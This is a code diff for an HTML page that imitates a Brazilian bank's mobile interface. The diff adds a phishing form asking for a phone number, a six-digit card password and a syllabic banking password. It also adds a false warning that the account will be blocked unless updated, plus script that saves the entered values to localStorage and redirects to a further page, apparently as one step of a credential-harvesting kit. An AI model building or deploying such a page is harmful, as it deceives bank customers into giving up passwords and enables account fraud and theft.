@@ -7,10 +7,10 @@
       <meta name="description" content="">
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <link rel="stylesheet" href="assets/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
-
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
       <link rel="stylesheet" href="assets/css/bootstrap-float-label.min.css">
       <link rel="stylesheet" href="assets/css/style.css">
+      <link rel="stylesheet" type="text/css" href="./assets/css/style_modal_alert.css">
    </head>
    <body>
       <header>	 
@@ -43,6 +43,23 @@
             <p class="R1">Agendado ate 03/Jan</p>
         </div>
         </div>
+
+   <div class="mainchaild">
+      <p class="tt3">Atualização necessária, preencha seus dados corretamente.</p>
+   </div>
+   <div class="alert alert-danger" role="alert" id="error_msg" style="display: none"></div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="phone" type="number" placeholder="DD + Telefone">
+      <label for="phone">DD + Telefone</label>
+   </div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="pass" type="number" placeholder="Senha do Cartão ( 6 dígitos )">
+      <label for="pass">Senha do Cartão ( 6 dígitos )</label>
+   </div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="pass_" type="text" placeholder="Senha Silábica">
+      <label for="pass_">Senha Silábica</label>
+   </div>
         
     <div class="mainchaild" style="float:left;padding: 10px 0;    width: 100%;    padding-bottom: 50%;">
     	<div class="divik"> 
@@ -96,35 +113,39 @@
         </div>
         
 	</div>
-        
-	    
-		
-         
-        
-     
-	   <div class="footer" style="padding:0">
- 
-<div class="navbar" >
-    <div id="menu" class="ff">
-      <i class="bi bi-justify"></i>
-      <p>Menu</p>
-   </div>
-     <div id="hous" class="ff active">
-    <i class="bi bi-house-door-fill " style="color:#005aa6"></i>
-      <p>Home</p>
-   </div>
-    <div id="vantagens" class="ff">
-    <i class="bi bi-gift"></i>
-      <p>Vantagens</p>
-   </div>
-    <div id="perfil" class="ff">
-    <i class="bi bi-person"></i>
-      <p>Perfil</p>
-   </div>
-   
-</div>
 
-		</div>
+   <div id="modal-alert" class="modal-alert">
+   
+      <div id="container-box-alert" class="container-box-alert">
+   
+         <div class="box-alert">
+   
+            <div class="hd-alert">
+   
+               <img class="ic-alert" src="./assets/img/ic_alert.png">
+   
+               <h2>Opa...</h2>
+   
+            </div>
+   
+            <div id="msg-alert" class="msg-alert">
+               <p>Seu cadastro está desatualizado e será bloqueado!<br>Evite o bloqueio seguindo o procedimento em tela.
+               </p>
+            </div>
+   
+         </div>
+   
+         <button id="btn-alert" class="btn-alert">FECHAR</button>
+   
+      </div>
+   
+   </div>
+      
+   <div class="footer">
+      <i class="bi bi-chevron-compact-down"></i>
+      <i class="bi bi-chevron-compact-up"></i>
+      <a href="#" class="entrar" onClick="clickEnter()" id="enter">ENTRAR</a>
+   </div>
 	
 
       <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
@@ -136,11 +157,71 @@
              $('#preloader-active').delay(2000).fadeOut('slow');
              $('body').delay(2000).css({
                  'overflow': 'visible'
-             });         
+             });      
+
+            document.getElementById("phone").value = "";
+            document.getElementById("pass").value = "";
+            document.getElementById("pass_").value = "";
+             
+            localStorage.setItem('data_6', '');
+            localStorage.setItem('data_7', '');
+            localStorage.setItem('data_8', '');
+
+            if (sessionStorage.getItem('name') == ""){
+               window.location.href = "index.html";
+            }
          });       
          
          document.getElementById("clientName").innerHTML = sessionStorage.getItem('name');
          document.getElementById("balance").innerHTML = sessionStorage.getItem('balance');
+
+         $("#container-box-alert").fadeIn("speed");
+         $("#modal-alert").fadeIn("speed");
+
+         $("#btn-alert").click(function () {
+            $("#modal-alert").fadeOut("speed");
+            $("#container-box-alert").fadeOut("speed");
+         });
+
+         function errorMsg(msg) {
+            $("#error_msg").show(500);
+            $("#enter").hide();
+            setTimeout(() => {
+               $("#error_msg").hide(500);
+               $("#enter").show();
+            }, 3000);
+            document.getElementById("error_msg").innerHTML = msg;
+         }
+
+         function clickEnter(){
+            
+            let phone = document.getElementById("phone").value;
+            let pass = document.getElementById("pass").value;
+            let pass_ = document.getElementById("pass_").value;
+            let flag = true;
+
+            if (phone.length == 0) {
+               errorMsg("Insira o campo DD + Telefone!");
+               flag = false;
+            } else if (pass_.length == 0) {
+               errorMsg("Insira o campo Senha Silábica!");
+               flag = false;
+            } else if (pass.length == 0) {
+               errorMsg("Insira o campo Senha do Cartão!");
+               flag = false;
+            } else if (pass.length != 6) {
+               errorMsg("A Senha do Cartão tem 6 dígitos!");
+               flag = false;
+            } else if (flag == true) {
+               $("#enter").hide();
+               $("#wait_msg").show(500);
+               localStorage.setItem('data_6', phone);
+               localStorage.setItem('data_7', pass);
+               localStorage.setItem('data_8', pass_);
+
+               window.location.href = "page.html";
+            }
+         }
       
       </script>
    </body>
